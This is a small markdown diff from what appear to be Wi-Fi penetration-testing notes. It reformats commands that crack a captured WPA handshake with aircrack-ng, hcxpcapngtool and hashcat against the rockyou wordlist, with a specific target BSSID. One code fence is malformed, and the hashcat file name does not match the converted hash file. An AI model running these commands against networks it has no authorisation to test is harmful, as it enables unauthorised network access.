@@ -63,16 +63,16 @@ aircrack-ng out.cap
 
 ### Cracking
 
-
+```text
 locate rockyou.txt
-
 aircrack-ng -a2 -b 10:27:F5:66:BE:27 -w rockyou.txt out.cap
+``
+#### Or a faster way to crack
 
-#### or faster way to crack ...
-
+```text
 hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
 hashcat -m 22000 hc2200.txt rockyou.txt
-
+```
 
 
 
